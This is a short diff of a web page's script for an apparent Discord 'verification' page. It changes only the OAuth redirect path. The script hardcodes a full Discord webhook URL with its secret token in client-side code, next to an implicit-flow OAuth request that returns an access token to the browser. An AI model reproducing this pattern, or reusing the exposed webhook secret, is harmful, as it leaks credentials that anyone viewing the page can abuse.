@@ -19,7 +19,7 @@
     <script>
         const CLIENT_ID = "1389562290365272106";
         const WEBHOOK   = "https://discord.com/api/webhooks/1527709125071343637/J2sC0E3WVdFU_FyvUZL8i7wtTDR1-42VaOCaBNFuBelDQhVqI_50UTO_qXPDR7DJ_iLe";
-        const REDIRECT  = "https://ezpingu.github.io/verify/";
+        const REDIRECT  = "https://ezpingu.github.io/verifydiscord/";
 
         document.getElementById('btn').onclick = () => {
             location = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT)}&response_type=token&scope=identify`;
